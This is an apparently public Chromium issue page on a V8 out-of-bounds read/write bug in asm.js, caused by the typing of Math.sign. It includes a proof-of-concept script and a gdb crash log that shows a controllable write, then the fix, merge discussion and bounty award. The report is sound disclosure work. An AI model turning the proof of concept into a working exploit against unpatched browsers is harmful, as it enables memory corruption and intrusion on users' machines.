# Security: V8 OOB read/write in asm.js

| Field | Value |
|-------|-------|
| **Issue ID** | [40085755](https://issues.chromium.org/issues/40085755) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler |
| **Reporter** | cw...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2016-10-21 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

Out of bound read/write is possible after optimizing some asm.js code.

**VERSION**  

Chrome 54.0.2840.71 stable  

V8 5.4.500.36 32bit

## **REPRODUCTION CASE** --------------------------- poc.js ------------- boom0 = (function(stdlib, foreign, heap){ "use asm"; var ff = Math.sign; var m32 = new stdlib.Int32Array(heap); function f(v) { m32[((1-ff(NaN) >>> 0) % 0xdc4e153) & v] = 0x12345678; } return f; })(this, {}, new ArrayBuffer(256)); %OptimizeFunctionOnNextCall(boom0); boom0(0xffffffff)

----------------- exploitability ---------------  

$ ../../../v8/out/ia32.release/d8 -version  

V8 version 5.4.500.36  

$ gdb -q --args ../../../v8/out/ia32.release/d8 --allow-natives-syntax ./c2.js  

Reading symbols from ../../../v8/out/ia32.release/d8...(no debugging symbols found)...done.  

(gdb) r  

Starting program: /home/tunz/working/v8/v8/out/ia32.release/d8 --allow-natives-syntax ./c2.js  

[Thread debugging using libthread\_db enabled]  

Using host libthread\_db library "/lib/x86\_64-linux-gnu/libthread\_db.so.1".  

[New Thread 0xf6aa2b40 (LWP 5526)]  

[New Thread 0xf62a1b40 (LWP 5527)]  

[New Thread 0xf5aa0b40 (LWP 5528)]  

[New Thread 0xf529fb40 (LWP 5529)]  

[New Thread 0xf4a9eb40 (LWP 5530)]  

[New Thread 0xf429db40 (LWP 5531)]  

[New Thread 0xf3a9cb40 (LWP 5532)]  

[New Thread 0xf329bb40 (LWP 5533)]

## Program received signal SIGSEGV, Segmentation fault. 0x518627e3 in ?? () (gdb) x/i $pc => 0x518627e3: mov DWORD PTR [eax\*4+0xa521b98],0x12345678 (gdb) i r eax eax 0x4141415 68424725

eax register (target address offset) and value are controllable.  

In similar way, read is also possible.

## Timeline

### cl...@chromium.org (2016-10-21)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5627019591417856

### mb...@chromium.org (2016-10-22)

Passing this off to the v8 sheriffs. I'm not able to reproduce this on the most recent version of d8, so there might be no work to do here.

Would one of you mind taking a look to see if there's anything we ought to merge in case something fixed this without us noticing?

[Monorail components: Blink>JavaScript]

### sh...@chromium.org (2016-10-23)

[Empty comment from Monorail migration]

### is...@chromium.org (2016-10-26)

[Empty comment from Monorail migration]

### bm...@chromium.org (2016-10-27)

This was already fixed by https://codereview.chromium.org/2306583002, we should back-merge to M54.

[Monorail components: -Blink>JavaScript Blink>JavaScript>Compiler]

### bm...@chromium.org (2016-10-27)

[Empty comment from Monorail migration]

### ha...@chromium.org (2016-10-27)

Please set to fixed too if this is fixed.

### bm...@chromium.org (2016-10-27)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/cac06c728dbc504464265ba15e7752699e21042d

commit cac06c728dbc504464265ba15e7752699e21042d
Author: Benedikt Meurer <bmeurer@google.com>
Date: Thu Oct 27 12:21:24 2016

Merged: [turbofan] Fix typing rule for Math.sign.

Revision: 25504a220f75f88b565cf36df73c00e5f2702c65

NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=ishell@chromium.org
BUG=chromium:658114

Review URL: https://codereview.chromium.org/2451283004 .

Cr-Commit-Position: refs/branch-heads/5.4@{#73}
Cr-Branched-From: 5ce282769772d94937eb2cb88eb419a6890c8b2d-refs/heads/5.4.500@{#2}
Cr-Branched-From: ad07b49d7b47b40a2d6f74d04d1b76ceae2a0253-refs/heads/master@{#38841}

[modify] https://crrev.com/cac06c728dbc504464265ba15e7752699e21042d/src/compiler/typer.cc
[modify] https://crrev.com/cac06c728dbc504464265ba15e7752699e21042d/src/type-cache.h
[add] https://crrev.com/cac06c728dbc504464265ba15e7752699e21042d/test/mjsunit/compiler/regress-math-sign-nan-type.js


### bm...@chromium.org (2016-10-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-27)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/172fa05b31583a31edd983df318b8c45d1c270ac

commit 172fa05b31583a31edd983df318b8c45d1c270ac
Author: hablich <hablich@chromium.org>
Date: Thu Oct 27 14:08:58 2016

Revert of Merged: [turbofan] Fix typing rule for Math.sign. (patchset #1 id:1 of https://codereview.chromium.org/2451283004/ )

Reason for revert:
Breaks tests: https://chromegw.corp.google.com/i/client.v8.branches/builders/V8%20Linux%20-%20stable%20branch/builds/229/steps/Check/logs/regress-math-sign-nan..

Original issue's description:
> Merged: [turbofan] Fix typing rule for Math.sign.
>
> Revision: 25504a220f75f88b565cf36df73c00e5f2702c65
>
> NOTRY=true
> NOPRESUBMIT=true
> NOTREECHECKS=true
> R=ishell@chromium.org
> BUG=chromium:658114
>
> Committed: https://chromium.googlesource.com/v8/v8/+/cac06c728dbc504464265ba15e7752699e21042d

TBR=ishell@chromium.org,bmeurer@chromium.org
# Skipping CQ checks because original CL landed less than 1 days ago.
NOPRESUBMIT=true
NOTREECHECKS=true
NOTRY=true
BUG=chromium:658114

Review-Url: https://codereview.chromium.org/2455503006
Cr-Commit-Position: refs/branch-heads/5.4@{#75}
Cr-Branched-From: 5ce282769772d94937eb2cb88eb419a6890c8b2d-refs/heads/5.4.500@{#2}
Cr-Branched-From: ad07b49d7b47b40a2d6f74d04d1b76ceae2a0253-refs/heads/master@{#38841}

[modify] https://crrev.com/172fa05b31583a31edd983df318b8c45d1c270ac/src/compiler/typer.cc
[modify] https://crrev.com/172fa05b31583a31edd983df318b8c45d1c270ac/src/type-cache.h
[delete] https://crrev.com/b913a92ff5e7fa22936eb9c609c0484dbf352984/test/mjsunit/compiler/regress-math-sign-nan-type.js


### ha...@chromium.org (2016-10-27)

Move to Jaro as requested.

### go...@chromium.org (2016-10-27)

+ bustamante@ (M54 Release owner) & awhalley@ (Security TPM)

hablich@, Is this require a merge to M55? If yes, please request a merge to M55. 




### aw...@chromium.org (2016-10-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-28)

Yes, I believe this needs a merge to M55.

### di...@chromium.org (2016-10-28)

Your change meets the bar and is auto-approved for M55 (branch: 2883)

### bm...@chromium.org (2016-10-29)

M55 doesn't have the bug (it includes jarin@'s fix already).

### di...@chromium.org (2016-10-29)

[Automated comment] Request affecting a post-stable build (M54), manual review required.

### ja...@chromium.org (2016-10-31)

The fix actually has two parts, @bmeurer tried to merge just the first one. That's why it failed.

commit 39d65198ed6e2c6d338f83cce78b4716cade32b8
Author: jarin <jarin@chromium.org>
Date:   Thu Sep 1 03:25:41 2016 -0700

    [turbofan] Fix Math.sign.
    
    Review-Url: https://codereview.chromium.org/2294143004
    Cr-Commit-Position: refs/heads/master@{#39073}


... and ...

commit 25504a220f75f88b565cf36df73c00e5f2702c65
Author: jarin <jarin@chromium.org>
Date:   Thu Sep 1 13:06:17 2016 -0700

    [turbofan] Fix typing rule for Math.sign.
    
    Review-Url: https://codereview.chromium.org/2306583002
    Cr-Commit-Position: refs/heads/master@{#39103}


### go...@chromium.org (2016-10-31)

jarin@, please request a merge to M55 ASAP if needed. 

### aw...@google.com (2016-10-31)

[Empty comment from Monorail migration]

### ja...@chromium.org (2016-11-01)

As @bmeurer noted at #18, this bug is not in M55. This should only be merged to M54.

### li...@chromium.org (2016-11-01)

Can someone please confirm whether the change is merged to M54? If yes please update with merge-merged label.

### bm...@chromium.org (2016-11-02)

It's not. Shall we merge it? There's no Merge-Approved-54 yet.

### bu...@google.com (2016-11-02)

Approving for merge into M54

### aw...@chromium.org (2016-11-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-11-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/d105cb6ca33b4632d96b99de525b12db37bc4995

commit d105cb6ca33b4632d96b99de525b12db37bc4995
Author: Jaroslav Sevcik <jarin@chromium.org>
Date: Thu Nov 03 05:31:15 2016

Merged: Math.sign fixes (Squashed multiple commits).

Merged: [turbofan] Fix Math.sign.
Revision: 39d65198ed6e2c6d338f83cce78b4716cade32b8

Merged: [turbofan] Fix typing rule for Math.sign.
Revision: 25504a220f75f88b565cf36df73c00e5f2702c65

NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=bmeurer@chromium.org
BUG=chromium:658114

Review URL: https://codereview.chromium.org/2473963002 .

Cr-Commit-Position: refs/branch-heads/5.4@{#79}
Cr-Branched-From: 5ce282769772d94937eb2cb88eb419a6890c8b2d-refs/heads/5.4.500@{#2}
Cr-Branched-From: ad07b49d7b47b40a2d6f74d04d1b76ceae2a0253-refs/heads/master@{#38841}

[modify] https://crrev.com/d105cb6ca33b4632d96b99de525b12db37bc4995/src/compiler/simplified-lowering.cc
[modify] https://crrev.com/d105cb6ca33b4632d96b99de525b12db37bc4995/src/compiler/typer.cc
[modify] https://crrev.com/d105cb6ca33b4632d96b99de525b12db37bc4995/src/type-cache.h
[add] https://crrev.com/d105cb6ca33b4632d96b99de525b12db37bc4995/test/mjsunit/compiler/math-sign.js


### li...@chromium.org (2016-11-03)

Removing - Merge-Approved-54 since the CL is already merged.

### aw...@chromium.org (2016-11-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-07)

Congratulations, the panel has awarded $5,000 for this report!

### aw...@chromium.org (2016-11-07)

[Empty comment from Monorail migration]

### aw...@google.com (2017-01-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-02-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/658114?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-07)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/chrome-blintz-user-guide

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085755)*
